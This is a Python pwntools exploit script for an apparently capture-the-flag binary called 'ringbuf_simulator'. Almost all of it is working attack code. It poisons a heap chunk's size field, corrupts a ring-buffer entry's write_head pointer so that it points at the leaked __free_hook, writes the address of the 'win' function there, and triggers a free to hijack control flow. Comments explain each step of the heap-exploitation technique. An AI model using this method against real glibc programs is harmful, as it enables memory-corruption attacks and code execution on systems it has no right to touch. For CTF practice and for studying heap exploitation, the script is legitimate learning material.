from pwn import *

context.terminal = ["kitty", "-e", "sh", "-c"]


p = process("./ringbuf_simulator")
# p = gdb.debug(
#     "./ringbuf_simulator_dbg_patched",
#     """b main
# continue""",
# )
# gdb.attach(
#     p,
#     """
#         break free
#         break malloc
#         watch __free_hook
#         watch *__free_hook
#         """,
# )
freehook_line = p.recvline()
FREE_HOOK_ADDRESS = int(freehook_line.split(b" ")[-1], 16)
print(f"Got __free_hook address {FREE_HOOK_ADDRESS:#016x}")
print(p.sendlineafter(b"> ", b"5000").decode("utf-8"))

print(p.sendlineafter(b"> ", b"1000").decode("utf-8"))  # A
print(p.sendlineafter(b"> ", b"1000").decode("utf-8"))  # B
print(p.sendlineafter(b"> ", b"1000").decode("utf-8"))  # C
print(p.sendlineafter(b"> ", b"1031").decode("utf-8"))  # D

print(p.sendlineafter(b"> ", b"0").decode("utf-8"))
print(p.sendlineafter(b"> ", b"1000").decode("utf-8"))

print(p.sendlineafter(b"> ", b"0").decode("utf-8"))
print(p.sendlineafter(b"> ", b"1000").decode("utf-8"))

print(p.sendlineafter(b"> ", b"0").decode("utf-8"))
print(p.sendlineafter(b"> ", b"1000").decode("utf-8"))

print(p.sendlineafter(b"> ", b"0").decode("utf-8"))
print(p.sendlineafter(b"> ", b"1000").decode("utf-8"))

pad = b"A" * 1000 + b"B" * 1000 + b"C" * 1000 + b"D" * 1031 + b"E" * 960
print(p.sendlineafter(b"> ", b"3").decode("utf-8"))
print(p.sendlineafter(b"> ", f"{len(pad)}".encode("utf-8")).decode("utf-8"))
print(
    p.sendlineafter(
        b"> ", b"A" * 1000 + b"B" * 1000 + b"C" * 1000 + b"D" * 1031 + b"E" * 960
    ).decode("utf-8")
)

# print(p.sendlineafter(b"> ", b"5").decode("utf-8"))
# print(p.recvuntil("0. add").decode("utf-8"))

print(p.sendlineafter(b"> ", b"1").decode("utf-8"))
print(p.sendlineafter(b"> ", b"7").decode("utf-8"))
print("Removed and freed entry 7")

# print(p.sendlineafter(b"> ", b"5").decode("utf-8"))
# print(p.recvuntil("0. add").decode("utf-8"))

# Do the actual exploit
# (We are overwriting the next size of )
overwrite_size = 1032 + 1032 + 1 + 16  # See how2heap
print(f"Overwriting next size with {overwrite_size:#016x} {p64(overwrite_size)}")
print(p.sendlineafter(b"> ", b"3").decode("utf-8"))
print(p.sendlineafter(b"> ", b"8").decode("utf-8"))
print(p.sendlineafter(b"> ", p64(overwrite_size)).decode("utf-8"))

print("Wrote poisoned next_size to chunk 5/F")

print(p.sendlineafter(b"> ", b"1").decode("utf-8"))
print(p.sendlineafter(b"> ", b"5").decode("utf-8"))
print("Removed and freed entry 5")
# Here we have an 0x821 chunk (2080) + prev_inuse in unsortedbin
# So we want to request 0x820-24-8=2048 size chunk to make sure we
# get it back
print(p.sendlineafter(b"> ", b"0").decode("utf-8"))
print(p.sendlineafter(b"> ", b"2048").decode("utf-8"))

# We have a weird corrupt size on chunk 4 so we will just remove it
# which will move the write head to the new entry 4, which is fine to write into
# because it is aligned correctly
print(p.sendlineafter(b"> ", b"1").decode("utf-8"))
print(p.sendlineafter(b"> ", b"4").decode("utf-8"))
print("Removed and freed entry 4")

# Size of chunks 4 and 5 which we will write completely with Zs just to mark them
print(p.sendlineafter(b"> ", b"3").decode("utf-8"))
print(p.sendlineafter(b"> ", b"2000").decode("utf-8"))
print(p.sendlineafter(b"> ", b"Z" * 2000).decode("utf-8"))

# Now we want to carefully overwrite the data pointer of chunk 5 to point to __free_hook
# First we write padding
print(p.sendlineafter(b"> ", b"3").decode("utf-8"))
print(p.sendlineafter(b"> ", b"1008").decode("utf-8"))
print(p.sendlineafter(b"> ", b"Y" * 1008).decode("utf-8"))

# Now we need to write over the size of the chunk, being careful to keep it the same size so
# we don't destabilize the ring, but we know the chunk size is 1041 or 0x411 because we control it
print(p.sendlineafter(b"> ", b"3").decode("utf-8"))
print(p.sendlineafter(b"> ", b"8").decode("utf-8"))
print(p.sendlineafter(b"> ", p64(0x411)).decode("utf-8"))

# The struct is laid out like:
# {
#     struct buf_ent * next;
#     size_t size;
#     char * write_head;
#     char data[];
# }
# We really just want to overwrite its write_head but will unfortunately clobber `next` in the
# process, so we need to make sure not to access it after we do this
print(p.sendlineafter(b"> ", b"3").decode("utf-8"))
print(
    p.sendlineafter(b"> ", bytes(f"{len(p64(FREE_HOOK_ADDRESS))}", "utf-8")).decode(
        "utf-8"
    )
)
print(p.sendlineafter(b"> ", p64(FREE_HOOK_ADDRESS)).decode("utf-8"))

# The write_head will for chunk 4 will now be a pointer to __free_hook so we just need to
# write win to it!

# First we delete 6, because we don't want to overwrite the next pointer on 4

print(p.sendlineafter(b"> ", b"1").decode("utf-8"))
print(p.sendlineafter(b"> ", b"6").decode("utf-8"))
print("Removed and freed entry 6")

# The write head for the ringbuf will now be the top of buf_ent 0 so we need to write 4031 padding
print(p.sendlineafter(b"> ", b"3").decode("utf-8"))
print(p.sendlineafter(b"> ", b"4031").decode("utf-8"))
print(p.sendlineafter(b"> ", b"X" * 4031).decode("utf-8"))

# This only works on the debug build
# print(p.sendlineafter(b"> ", b"5").decode("utf-8"))
# print(p.recvuntil("0. add").decode("utf-8"))

# We need to calculate the libc base address, which is easy since we have it
e = p.elf
win = e.symbols["win"]

print("Wrote padding, ready to overwrite __free_hook")
print(p.sendlineafter(b"> ", b"3").decode("utf-8"))
print(p.sendlineafter(b"> ", b"8").decode("utf-8"))
print(p.sendlineafter(b"> ", p64(win)).decode("utf-8"))

# Now we can free any entry, we will pick 5
print(p.sendlineafter(b"> ", b"1").decode("utf-8"))
print(p.sendlineafter(b"> ", b"5").decode("utf-8"))
print("Removed and freed entry 5")

p.interactive()
